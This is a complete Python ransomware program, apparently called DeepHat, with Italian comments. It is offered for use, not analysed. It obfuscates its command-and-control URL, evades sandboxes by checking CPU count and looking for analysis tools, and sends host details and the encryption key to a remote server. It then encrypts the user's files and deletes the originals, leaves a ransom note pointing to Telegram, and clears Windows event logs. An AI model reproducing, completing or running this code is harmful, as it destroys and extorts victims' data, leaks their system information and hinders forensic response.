import os
import sys
import platform
import socket
import threading
import subprocess
import base64
import time
from cryptography.fernet import Fernet
import requests

class DeepHatCore:
    """
    DeepHat Advanced Ransomware Orchestrator.
    Progettato per evasione statica, comunicazione C2 sicura e anti-forensics.
    """
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.target_extensions = ('.docx', '.pdf', '.jpg', '.png', '.xlsx', '.txt', '.mp4', '.pptx', '.sql', '.db')
        
        # 1. OFFUSCAMENTO: Configurazione dei parametri di comunicazione
        # Invece di URL in chiaro, usiamo una stringa XOR-ata con una chiave operativa
        self.c2_key = "DeepHat_Operational_Key_2024" 
        self.c2_endpoint = self._xor_cipher("https://tuo-dominio-o-ngrok.com/collect", self.c2_key)
        
        self.user_info = self._gather_intel()

    def _xor_cipher(self, data: str, key: str) -> str:
        """
        Funzione XOR simmetrica per offuscare stringhe (URL, Token, ecc.)
        L'analista vedrà solo caratteri illeggibili nel binario.
        """
        return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

    def _gather_intel(self):
        """Raccoglie i dati dell'host compromesso."""
        try:
            return {
                "username": os.getlogin(),
                "os": platform.system() + " " + platform.release(),
                "ip": self._get_public_ip(),
                "hostname": socket.gethostname()
            }
        except:
            return {"username": "Unknown", "os": "Unknown", "ip": "Unknown", "hostname": "Unknown"}

    def _get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org', timeout=5).text
        except:
            return "Internal/Local IP"

    def check_environment(self):
        """
        Anti-Sandboxing: Verifica se ci troviamo in un ambiente di analisi.
        """
        # 1. Controllo CPU Cores (Le VM di test hanno spesso 1-2 core)
        if os.cpu_count() < 2:
            return False
        
        # 2. Controllo Processi Sospetti
        suspicious_procs = ['wireshark', 'procmon', 'x64dbg', 'ida', 'vmtoolsd', 'regshot']
        try:
            output = subprocess.check_output('tasklist', shell=True).lower()
            for proc in suspicious_procs:
                if proc in output:
                    return False
        except:
            pass
        return True

    def exfiltrate_data(self):
        """
        Invia i dati al C2. L'URL viene decifrato solo a runtime.
        """
        decoded_url = self._xor_cipher(self.c2_endpoint, self.c2_key)
        payload = {
            "info": {
                "user": self.user_info['username'],
                "os": self.user_info['os'],
                "key": self.key.decode(),
                "ip": self.user_info['ip']
            }
        }
        try:
            # Timeout e User-Agent personalizzati per non sembrare Python
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            requests.post(decoded_url, json=payload, headers=headers, timeout=10)
        except:
            pass

    def encrypt_file_worker(self, file_path):
        """Worker per la crittografia. Isolamento per gestire gli errori."""
        try:
            if file_path.endswith('.locked'):
                return
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            with open(file_path + ".locked", 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)
        except Exception:
            pass

    def secure_scan(self, start_dir):
        """
        Scansione multi-thread ottimizzata.
        """
        threads = []
        for root, _, files in os.walk(start_dir):
            for file in files:
                if file.endswith(self.target_extensions):
                    full_path = os.path.join(root, file)
                    t = threading.Thread(target=self.encrypt_file_worker, args=(full_path,))
                    threads.append(t)
                    t.start()
                    
                    # Pool di 20 thread per non saturare la CPU
                    if len(threads) > 20:
                        for thread in threads:
                            thread.join()
                        threads = []
        for thread in threads:
            thread.join()

    def drop_note(self):
        """Crea la nota di riscatto."""
        note_content = (
            f"FILE ENCRYPTED - DECRYPTION KEY: {self.key.decode()}\n\n"
            "Per il recupero, contatta il supporto via Telegram.\n"
        )
        try:
            note_path = os.path.join(os.path.expanduser("~"), "DECRYPT_README.txt")
            with open(note_path, "w") as f:
                f.write(note_content)
        except:
            pass

    def clean_forensics(self):
        """
        Anti-Forensics: Pulizia dei log di sistema.
        Da eseguirsi alla fine dell'operazione.
        """
        # Pulizia dei log principali di Windows
        logs_to_clear = ["Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational"]
        for log in logs_to_clear:
            try:
                subprocess.run(f"wevtutil cl {log}", shell=True, capture_output=True, check=True)
            except:
                pass

        # Pulizia dei file temporanei creati dal malware
        temp_dir = os.environ.get('TEMP')
        if temp_dir:
            for f in os.listdir(temp_dir):
                if f.startswith("deephat_"):
                    try:
                        os.remove(os.path.join(temp_dir, f))
                    except:
                        pass

    def run(self):
        """
        Orchestratore principale.
        """
        if not self.check_environment():
            return # Silently exit if in sandbox

        # 1. Esfiltrazione Dati (Background)
        threading.Thread(target=self.exfiltrate_data, daemon=True).start()
        
        # 2. Crittografia File (Foreground)
        user_home = os.path.expanduser("~")
        self.secure_scan(user_home)
        
        # 3. Nota di Riscatto
        self.drop_note()
        
        # 4. Pulizia Forense (Ultimo passo)
        self.clean_forensics()

if __name__ == "__main__":
    core = DeepHatCore()
    core.run()